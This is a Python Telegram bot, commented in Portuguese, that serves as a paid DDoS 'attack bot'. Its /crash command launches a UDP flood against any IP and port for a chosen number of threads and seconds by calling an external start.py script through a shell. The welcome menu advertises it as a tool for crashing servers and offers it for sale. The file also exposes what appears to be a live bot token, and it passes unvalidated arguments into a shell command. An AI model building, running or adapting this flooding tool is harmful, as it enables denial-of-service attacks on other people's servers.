import telebot
import subprocess
import re
import time
from threading import Thread
import requests

BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}
usuarios = [SEU_ID_TELEGRAM]  # Lista de usuários autorizados
vip_usuarios = []  # Lista de usuários VIP

# Função para validar o formato do IP:PORTA
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    match = re.match(padrao, ip_porta)
    return match is not None

# Função para executar o comando
def executar_comando(ip_porta, threads, tempo):
    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
    try:
        processo = subprocess.Popen(
            comando_terminal, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        processos[ip_porta] = processo
        time.sleep(int(tempo))
        processo.terminate()
        return f"Comando para {ip_porta} concluído ou interrompido após {tempo} segundos."
    except Exception as e:
        return f"Erro ao executar o comando: {str(e)}"

# Comando /start com mensagem de menu mais bonita
@bot.message_handler(commands=['start'])
def start_message(message):
    bot.reply_to(
        message, 
        "🌟 **Bem-vindo ao Bot de Ataques!** 🌟\n\n"
        "Olá, **{0}**! Eu sou o seu assistente virtual para testes de servidores. Aqui estão os **comandos disponíveis** para você:\n\n"
        
        "🛠️ **/crash <IP:PORTA> <threads> <tempo>** - Iniciar um ataque ao servidor 🚀\n"
        "🔒 **/adduser <ID>** - Adicionar um novo usuário (Admin+)\n"
        "❌ **/removeuser <ID>** - Remover um usuário (Admin+)\n"
        "💎 **/addvip <ID>** - Tornar um usuário VIP (Apenas o dono)\n"
        "💔 **/removevip <ID>** - Remover o status de VIP de um usuário (Apenas o dono)\n"
        "🔍 **/checkban <ID>** - Verificar se uma conta de Free Fire está banida 🚫\n"
        "💳 **/comprarbot** - Saiba como comprar este incrível bot! 💸\n\n"
        
        "📚 Caso precise de ajuda com qualquer comando, é só me chamar! Estou sempre por aqui 😎\n\n"
        "👑 **Dono**: {1}\n\n"
        "👥 **Usuários atuais**: {2}\n\n"
        "🎯 **Deseja iniciar um ataque?** Só digitar o comando e vamos lá! 💥".format(
            message.from_user.first_name,
            SEU_ID_TELEGRAM,
            len(usuarios)
        )
    )

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.reply_to(message, "Acesso negado.")
        return
    try:
        comando = message.text.split()
        if len(comando) < 4:
            bot.reply_to(message, "Uso: /crash <IP:PORTA> <threads> <tempo>")
            return
        ip_porta = comando[1]
        threads = comando[2]
        tempo = comando[3]
        if not validar_ip_porta(ip_porta):
            bot.reply_to(message, "Formato inválido de IP:PORTA.")
            return
        bot.reply_to(message, f"Iniciando ataque para {ip_porta}...")
        thread = Thread(target=executar_comando, args=(ip_porta, threads, tempo))
        thread.start()
        bot.reply_to(message, f"Comando enviado! O ataque começará para {ip_porta}.")
    except Exception as e:
        bot.reply_to(message, f"Erro: {str(e)}")

# Comando /adduser
@bot.message_handler(commands=['adduser'])
def add_user(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.reply_to(message, "Acesso negado. Apenas o dono pode adicionar usuários.")
        return
    try:
        comando = message.text.split()
        if len(comando) < 2:
            bot.reply_to(message, "Uso: /adduser <ID do usuário>")
            return
        user_id = int(comando[1])
        if user_id not in usuarios:
            usuarios.append(user_id)
            bot.reply_to(message, f"Usuário {user_id} adicionado com sucesso!")
        else:
            bot.reply_to(message, "Este usuário já está na lista.")
    except Exception as e:
        bot.reply_to(message, f"Erro: {str(e)}")

# Comando /removeuser
@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.reply_to(message, "Acesso negado. Apenas o dono pode remover usuários.")
        return
    try:
        comando = message.text.split()
        if len(comando) < 2:
            bot.reply_to(message, "Uso: /removeuser <ID do usuário>")
            return
        user_id = int(comando[1])
        if user_id in usuarios:
            usuarios.remove(user_id)
            bot.reply_to(message, f"Usuário {user_id} removido com sucesso!")
        else:
            bot.reply_to(message, "Este usuário não está na lista.")
    except Exception as e:
        bot.reply_to(message, f"Erro: {str(e)}")

# Comando /addvip
@bot.message_handler(commands=['addvip'])
def add_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.reply_to(message, "Acesso negado. Apenas o dono pode adicionar VIPs.")
        return
    try:
        comando = message.text.split()
        if len(comando) < 2:
            bot.reply_to(message, "Uso: /addvip <ID do usuário>")
            return
        user_id = int(comando[1])
        if user_id not in vip_usuarios:
            vip_usuarios.append(user_id)
            bot.reply_to(message, f"Usuário {user_id} promovido a VIP!")
        else:
            bot.reply_to(message, "Este usuário já é VIP.")
    except Exception as e:
        bot.reply_to(message, f"Erro: {str(e)}")

# Comando /removevip
@bot.message_handler(commands=['removevip'])
def remove_vip(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.reply_to(message, "Acesso negado. Apenas o dono pode remover VIPs.")
        return
    try:
        comando = message.text.split()
        if len(comando) < 2:
            bot.reply_to(message, "Uso: /removevip <ID do usuário>")
            return
        user_id = int(comando[1])
        if user_id in vip_usuarios:
            vip_usuarios.remove(user_id)
            bot.reply_to(message, f"Usuário {user_id} removido de VIP.")
        else:
            bot.reply_to(message, "Este usuário não é VIP.")
    except Exception as e:
        bot.reply_to(message, f"Erro: {str(e)}")

# Comando /checkban
@bot.message_handler(commands=['checkban'])
def check_ban(message):
    try:
        comando = message.text.split()
        if len(comando) < 2:
            bot.reply_to(message, "Uso: /checkban <ID do jogador>")
            return
        player_id = comando[1]
        bot.reply_to(message, "🔍 Analisando a conta, por favor aguarde...")

        api_url = f"https://api.nowgarena.com/api/check_banned?uid={player_id}"
        response = requests.get(api_url)
        data = response.json()

        if data.get("status") == "success":
            is_banned = data.get("isBanned")
            if is_banned == "no":
                bot.reply_to(
                    message,
                    f"✅ *A conta não está banida!*\n\n🆔 ID: {data.get('uid')}",
                    parse_mode="Markdown"
                )
            elif is_banned == "yes":
                period = data.get("period", "indefinido")
                bot.reply_to(
                    message,
                    f"🚫 *A conta está banida!*\n\n🆔 ID: {data.get('uid')}\n⏳ Período: {period} dias",
                    parse_mode="Markdown"
                )
        else:
            bot.reply_to(message, "❌ *Erro ao processar a solicitação. Tente novamente mais tarde.*", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ *Erro ao processar a solicitação: {str(e)}*", parse_mode="Markdown")

# Comando /comprarbot
@bot.message_handler(commands=['comprarbot'])
def comprar_bot(message):
    bot.reply_to(message, "💸 Para comprar o bot, entre em contato com o dono do bot.")

bot.polling()